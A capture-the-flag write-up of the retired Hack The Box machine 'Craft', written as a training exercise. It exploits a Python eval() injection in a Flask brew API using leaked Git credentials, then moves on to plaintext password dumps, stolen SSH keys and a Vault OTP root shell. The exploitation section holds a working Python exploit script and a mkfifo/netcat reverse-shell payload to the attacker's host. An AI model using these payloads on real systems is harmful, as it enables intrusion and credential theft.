@@ -1,0 +1,344 @@
+I":n<p><img src="/wp-content/uploads/2019/08/craft/badge.png" alt="Hack The Box Haystack" /></p>
+
+<h1 id="introduction">Introduction</h1>
+<p>Today they retired my favorite box so far, Craft. This box was very real world in the chain of mistakes that lead to each exploit. The beer theme and Silicon Valley theme were also awesome. A+ box, and here’s the writeup.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<h2 id="port-scan-nmap">Port Scan: Nmap</h2>
+<p>We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~#</span><span class="w"> </span>nmap <span class="nt">-sVC</span> 10.10.10.110
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-13 23:23 EDT
+Nmap scan report for craft.htb (10.10.10.110)
+Host is up (0.40s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
+| ssh-hostkey:
+|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
+|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
+|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
+443/tcp open  ssl/http nginx 1.15.8
+|_http-server-header: nginx/1.15.8
+|_http-title: 400 The plain HTTP request was sent to HTTPS port
+| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
+| Not valid before: 2019-02-06T02:25:47
+|_Not valid after:  2020-06-20T02:25:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  http/1.1
+| tls-nextprotoneg:
+|_  http/1.1
+</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+<span class="go">
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 62.69 seconds
+
+</span></code></pre></div></div>
+<p>We see from the output above that ports <strong>22</strong> and <strong>443</strong> are open, meaning we’ve got <code class="language-plaintext highlighter-rouge">ssh</code> and <code class="language-plaintext highlighter-rouge">https</code> to play with. Let’s explore port <strong>443</strong>.</p>
+
+<h3 id="port-443-craft">Port 443: Craft</h3>
+
+<p><img src="/wp-content/uploads/2020/01/craft/craft_homepage.png" alt="Craft Homepage" />
+<strong>Figure 1:</strong> Craft’s Homepage</p>
+
+<p>So it looks like there are some links to subdomains. Let’s add these to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file so that we can access the other virtual hosts running on the box.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">cat</span> /etc/hosts
+<span class="go">127.0.0.1 localhost
+127.0.1.1 kali
+10.10.10.110    craft.htb
+10.10.10.110    api.craft.htb
+10.10.10.110    gogs.craft.htb
+
+</span><span class="gp">#</span><span class="w"> </span>The following lines are desirable <span class="k">for </span>IPv6 capable hosts
+<span class="go">::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</span></code></pre></div></div>
+
+<p>Now we can access the two links in the upper right hand corner <code class="language-plaintext highlighter-rouge">https://api.craft.htb/api</code> and <code class="language-plaintext highlighter-rouge">https://gogs.craft.htb</code>.</p>
+
+<p>We see the documentation page for <code class="language-plaintext highlighter-rouge">Craft API 1.0</code>. The page gives us some information about the API’s endpoints and how to interact with them.</p>
+
+<p><img src="/wp-content/uploads/2020/01/craft/craft_api_page.png" alt="Craft API 1.0" />
+<strong>Figure 2:</strong> Craft API 1.0</p>
+
+<p>The other link on the page is to <em><a href="https://gogs.io/">Gogs</a></em>, a self hosted git repository. This is fun! It looks like we may get to hack an open source program. Does this remind you of digging through repos on <em><a href="https://github.com">GitHub</a></em>?</p>
+
+<p>Going through the commit history we come across some committed credentials right away. The screenshot actually contains the commit in which they were removed, but we can see through red highlighting!</p>
+
+<p><img src="/wp-content/uploads/2020/01/craft/gogs_credentials.png" alt="API Credentials in Commit" />
+<strong>Figure 3:</strong> API Credentials in Commit</p>
+
+<p>It looks like these credentials will also log us into the Gogs account for Dinesh, but there’s nothing much to see inside Dinesh’s account.</p>
+
+<p>By taking a look at the Craft API code we see it’s a <code class="language-plaintext highlighter-rouge">Python / Flask</code> application. Furthermore, it looks like the endpoint <code class="language-plaintext highlighter-rouge">/craft_api/api/brew/endpoints/brew.py</code> calls the <code class="language-plaintext highlighter-rouge">eval()</code> function on user input!. It says that authentication is required, but I think we’ve got that covered already with  <code class="language-plaintext highlighter-rouge">auth=('dinesh', '4aUh0A8PbVJxgd')</code>.</p>
+
+<p><img src="/wp-content/uploads/2020/01/craft/eval_in_brew_endpoint.png" alt="Eval code in brew.py" />
+<strong>Figure 4:</strong> Exploitable code in <code class="language-plaintext highlighter-rouge">/craft_api/api/brew/endpoints/brew.py</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="o">@</span><span class="n">auth</span><span class="p">.</span><span class="n">auth_required</span>
+    <span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">expect</span><span class="p">(</span><span class="n">beer_entry</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">post</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="s">"""
+        Creates a new brew entry.
+        """</span>
+
+        <span class="c1"># make sure the ABV value is sane.
+</span>        <span class="k">if</span> <span class="nb">eval</span><span class="p">(</span><span class="s">'%s &gt; 1'</span> <span class="o">%</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]):</span>
+            <span class="k">return</span> <span class="s">"ABV must be a decimal value less than 1.0"</span><span class="p">,</span> <span class="mi">400</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">create_brew</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">)</span>
+            <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="mi">201</span>
+</code></pre></div></div>
+
+<p>We could use <code class="language-plaintext highlighter-rouge">curl</code> or <code class="language-plaintext highlighter-rouge">postman</code> to send requests to the API, but if we continue to look through the git repo we see in commit <code class="language-plaintext highlighter-rouge">10e3ba4f0a09c778d7cec673f28d410b73455a86</code> that they’ve got a test script already to post new brews.</p>
+
+<p><img src="/wp-content/uploads/2020/01/craft/added_test.png" alt="Added test" />
+<strong>Figure 5:</strong> add test script you say!?</p>
+
+<p>Download the test script from here and we’ll use it to send a payload to the app. <code class="language-plaintext highlighter-rouge">https://gogs.craft.htb/Craft/craft-api/src/10e3ba4f0a09c778d7cec673f28d410b73455a86/tests/test.py</code></p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>So far we’ve found an API, a <code class="language-plaintext highlighter-rouge">git</code> repository containing Python code which seems vulnerable to command injection, as well as a commit containing credentials and a test script.</p>
+
+<p>Developing the exploit isn’t easy. We can test the code locally but we don’t know exactly what’s installed on the machine. This process required developing several payloads that ran correctly locally, only to fail on the box. As it turns out, the box doesn’t have <code class="language-plaintext highlighter-rouge">bash</code> installed on it. Eventually we’re able to gain a reverse shell using netcat with the following payload sent to <code class="language-plaintext highlighter-rouge">avb</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">"""__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.186 4444 &gt;/tmp/f") """</span>
+</code></pre></div></div>
+
+<p>Here’s the modified <code class="language-plaintext highlighter-rouge">test.py</code> script with the payload to call our reverse shell.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/login'</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s">'dinesh'</span><span class="p">,</span> <span class="s">'4aUh0A8PbVJxgd'</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">json_response</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+<span class="n">token</span> <span class="o">=</span>  <span class="n">json_response</span><span class="p">[</span><span class="s">'token'</span><span class="p">]</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"""__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.186 4444 &gt;/tmp/f") """</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">'X-Craft-API-Token'</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span>  <span class="p">}</span>
+<span class="c1"># create a sample brew with real shell code... should exploit!
+</span><span class="k">print</span><span class="p">(</span><span class="s">"Create exploit brew!"</span><span class="p">)</span>
+<span class="n">brew_dict</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="n">brew_dict</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
+<span class="n">brew_dict</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit199iii1'</span>
+<span class="n">brew_dict</span><span class="p">[</span><span class="s">'brewer'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit1991'</span>
+<span class="n">brew_dict</span><span class="p">[</span><span class="s">'style'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshi1991t'</span>
+
+<span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">brew_dict</span><span class="p">)</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/brew/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json_data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>When we run the script with our sexy little payload we catch a reverse shell, and gain our initial foothold.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>nc <span class="nt">-lvp</span> 4444
+<span class="go">listening on [any] 4444 ...
+connect to [10.10.14.186] from craft.htb [10.10.10.110] 35703
+</span><span class="gp">/bin/sh: can't access tty;</span><span class="w"> </span>job control turned off
+<span class="gp">/opt/app #</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">root
+</span><span class="gp">/opt/app #</span><span class="w"> </span><span class="nb">cd</span> /
+<span class="gp">/ #</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 64
+drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
+drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
+-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
+</span><span class="c">...
+...
+...
+</span><span class="gp">/ #</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="user-flag">User Flag</h2>
+<p>It looks like we’re in a docker container, so we need to escape that somehow. Under <code class="language-plaintext highlighter-rouge">/opt/app</code> we see a file named <code class="language-plaintext highlighter-rouge">dbtest.py</code>. Here are the contents of that file.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="kn">import</span> <span class="nn">pymysql</span>
+<span class="kn">from</span> <span class="nn">craft_api</span> <span class="kn">import</span> <span class="n">settings</span>
+
+<span class="c1"># test connection to mysql database
+</span>
+<span class="n">connection</span> <span class="o">=</span> <span class="n">pymysql</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_HOST</span><span class="p">,</span>
+                             <span class="n">user</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_USER</span><span class="p">,</span>
+                             <span class="n">password</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_PASSWORD</span><span class="p">,</span>
+                             <span class="n">db</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_DB</span><span class="p">,</span>
+                             <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="p">.</span><span class="n">cursors</span><span class="p">.</span><span class="n">DictCursor</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">with</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
+        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"</span>
+        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>If we modify <code class="language-plaintext highlighter-rouge">dbtest.py</code> to execute other commands we can explore the application’s mysql database a bit more.</p>
+
+<p>First, let’s see what tables we have in here. We replace the sql statement above with one to show us the tables, and replace the <code class="language-plaintext highlighter-rouge">fetchone()</code> command with <code class="language-plaintext highlighter-rouge">fetchall()</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">with</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
+        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SHOW TABLES"</span>
+        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Here’s what we get for tables in the craft database.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/opt/app #</span><span class="w"> </span>python hh.py
+<span class="go">[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
+</span></code></pre></div></div>
+
+<p>Oh look a <code class="language-plaintext highlighter-rouge">user</code> table, let’s dump that out and see what we get! Again we replace the sql command, this time to display the entire <code class="language-plaintext highlighter-rouge">user</code> table.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">with</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
+        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SELECT * FROM `user`"</span>
+        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/opt/app #</span><span class="w"> </span>python hh.py
+<span class="go">[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
+</span></code></pre></div></div>
+
+<p>Oh my, they’re storing passwords in plain text! There must be some credential stuffing we can do with all these.</p>
+
+<p>We already had the credentials for dinesh, but now we’ve got the credentials for everyone. It doesn’t look like we can ssh in with any of these creds, but let’s go back to Gogs and start trying them there. We already know that dinesh reused his password, so maybe the others did too.</p>
+
+<p>It looks like we can login as gilfoyle, and it seems he’s got a private repository in his account.</p>
+
+<p><img src="/wp-content/uploads/2020/01/craft/private_repo.png" alt="private repository" />
+<strong>Figure 5:</strong> craft_infra private repo.</p>
+
+<p>When we explore the private <code class="language-plaintext highlighter-rouge">craft_infra</code> repository, we see that this crazy dude committed his private and public keys.</p>
+
+<p><img src="/wp-content/uploads/2020/01/craft/id_rsa_pub.png" alt="ssh keys" />
+<strong>Figure 6:</strong> ssh keys inside.</p>
+
+<p>Another really interesting bit of information in this private repo is in <code class="language-plaintext highlighter-rouge">craft_infra/vault/secrets.sh</code>.</p>
+
+<p><img src="/wp-content/uploads/2020/01/craft/vault_secrets_sh.png" alt="vault secrets" />
+<strong>Figure 7:</strong> vault secrets!</p>
+
+<p>It appears as though he’s running <code class="language-plaintext highlighter-rouge">vault</code> as root. Once we get access to the user flag, we’ll probably be using this for our privilege escalation to root.</p>
+
+<p>First, let’s add the keys we’ve found to our own <code class="language-plaintext highlighter-rouge">~/.ssh/</code> directory in kali and see if we can get the user flag finally.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~/.ssh#</span><span class="w"> </span>ssh-add
+<span class="go">Enter passphrase for /root/.ssh/id_rsa:
+Identity added: /root/.ssh/id_rsa (gilfoyle@craft.htb)
+</span><span class="gp">root@kali:~/.ssh#</span><span class="w"> </span>ssh gilfoyle@craft.htb
+<span class="go">
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+</span><span class="gp">Linux craft.htb 4.9.0-8-amd64 #</span>1 SMP Debian 4.9.130-2 <span class="o">(</span>2018-10-27<span class="o">)</span> x86_64
+<span class="go">
+</span><span class="gp">The programs included with the Debian GNU/Linux system are free software;</span><span class="w">
+</span><span class="go">the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Aug 13 18:45:12 2019 from 10.10.14.167
+</span><span class="gp">gilfoyle@craft:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">bbf4b0cadfa3d4e6d0914c9cd5a612d4
+</span><span class="gp">gilfoyle@craft:~$</span><span class="w">
+</span></code></pre></div></div>
+
+<p>After adding gilfoyle’s keys and using his password once again for <code class="language-plaintext highlighter-rouge">ssh-add</code>, you can see we gain the user flag. On to the root portion we go.</p>
+
+<h2 id="root-flag">Root Flag</h2>
+<p>Now we already know about something very important, and thats <code class="language-plaintext highlighter-rouge">vault</code>. After some research on how to craft the command we’re able to easily gain a root shell through this application.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gilfoyle@craft:/$</span><span class="w"> </span>vault ssh <span class="nt">-mode</span><span class="o">=</span>otp <span class="nt">-role</span><span class="o">=</span>root_otp root@craft.htb
+<span class="go">Vault could not locate "sshpass". The OTP code for the session is displayed
+below. Enter this code in the SSH password prompt. If you install sshpass,
+Vault can automatically perform this step for you.
+OTP for the session is: 60fafe1c-2221-6dd7-d16f-9c6ba0c996eb
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Password:
+</span><span class="gp">Linux craft.htb 4.9.0-8-amd64 #</span>1 SMP Debian 4.9.130-2 <span class="o">(</span>2018-10-27<span class="o">)</span> x86_64
+<span class="go">
+</span><span class="gp">The programs included with the Debian GNU/Linux system are free software;</span><span class="w">
+</span><span class="go">the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Aug 13 18:48:35 2019 from ::1
+</span><span class="gp">root@craft:~#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
+<span class="go">831d64ef54d92c1af795daae28a11591
+</span><span class="gp">root@craft:~#</span><span class="w">
+</span></code></pre></div></div>
+
+<p>That’s all there is!</p>
+
+<p><img src="/wp-content/uploads/2020/01/craft/rooted.png" alt="rooted" />
+<strong>Figure 8:</strong> rooted.</p>
+
+<h1 id="conclusion">Conclusion</h1>
+<p>This box was fun from the beginning. I enjoyed going through the <code class="language-plaintext highlighter-rouge">Flask</code> code in the <code class="language-plaintext highlighter-rouge">git</code> repository to find a vulnerability, as well as finding the credentials and test script in an old commit. This gain of the initial foothold seemed to me to be <strong>very realistic</strong>. I’ve seen this type of mistake chain a lot in my years as a developer. Developing the exploit to get code execution was rather difficult (for me at least). Not knowing bash wasn’t installed held me up for quite a while on this phase.</p>
+
+<p>I will say that storing credentials in plain text is probably almost as bad, or worse, than using the <code class="language-plaintext highlighter-rouge">eval()</code> function, but some people still do this crap too. Running vault as root is also a mistake, but a lazy developer may do too for one reason or another. All in all Craft has been my absolute favorite box thus far.</p>
+
+<h1 id="references">References</h1>
+<ol>
+  <li><a href="http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html">http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html</a></li>
+  <li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
+  <li><a href="https://stackoverflow.com/questions/44250002/how-to-solve-sign-and-send-pubkey-signing-failed-agent-refused-operation">https://stackoverflow.com/questions/44250002/how-to-solve-sign-and-send-pubkey-signing-failed-agent-refused-operation</a></li>
+  <li><a href="https://www.vaultproject.io/docs/commands/ssh.html">https://www.vaultproject.io/docs/commands/ssh.html</a></li>
+</ol>
+:ET
